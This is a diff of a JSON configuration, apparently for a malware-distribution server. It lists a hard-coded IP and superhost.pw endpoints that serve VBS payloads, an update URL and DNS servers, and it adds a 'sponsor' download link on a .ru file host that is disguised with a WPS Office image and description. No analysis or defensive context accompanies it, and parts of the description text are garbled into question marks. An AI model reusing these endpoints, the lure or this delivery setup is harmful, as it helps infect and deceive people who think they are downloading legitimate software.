@@ -1,14 +1,23 @@
 $server = '{
     "disableVirus":  true,
+    "dnSponsor":  [
+                      {
+                          "enabled":  true,
+                          "id":  "ufiler.biz",
+                          "url":  "https://ufiler-pro2.ru/download/3974/?file={dn_url}\u0026poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png\u0026size=10 ??.\u0026description=??????????????????? ???????? ????? ?? ????? ?????????\u0026theme=software"
+                      }
+                  ],
     "phpTemplateFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\dn.php",
+    "phpTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.php",
+    "htmlTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.html",
     "UpdateFile":  null,
     "server":  "185.247.141.76",
     "strahServer":  null,
-    "dnVbsLinkShort":  "185.247.141.76/default/OZCDEzg5Ep/none/GetVbs",
-    "dnVbsLink":  "http://0.superhost.pw/185.247.141.76/default/ih6eas1APr/none/GetVbs",
+    "dnVbsLinkShort":  "185.247.141.76/default/PWMQuWr2Rm/none/GetVbs",
+    "dnVbsLink":  "http://0.superhost.pw/185.247.141.76/default/U4SHEy4ZfD/none/GetVbs",
     "phpVbsLinkShort":  "185.247.141.76/default/GetVbsPhp",
-    "dnLightVbsLinkShort":  "185.247.141.76/default/tviCn59B1P/none/GetLightVbs",
-    "dnLightVbsLink":  "http://0.superhost.pw/185.247.141.76/default/qpcErzOPpy/none/GetLightVbs",
+    "dnLightVbsLinkShort":  "185.247.141.76/default/t0FoFERdpq/none/GetLightVbs",
+    "dnLightVbsLink":  "http://0.superhost.pw/185.247.141.76/default/X9HtJ0N9aV/none/GetLightVbs",
     "phpLightVbsLinkShort":  "185.247.141.76/default/GetLightVbsPhp",
     "updateUrl":  "http://0.superhost.pw/185.247.141.76/update",
     "primaryDns":  "185.247.141.78",
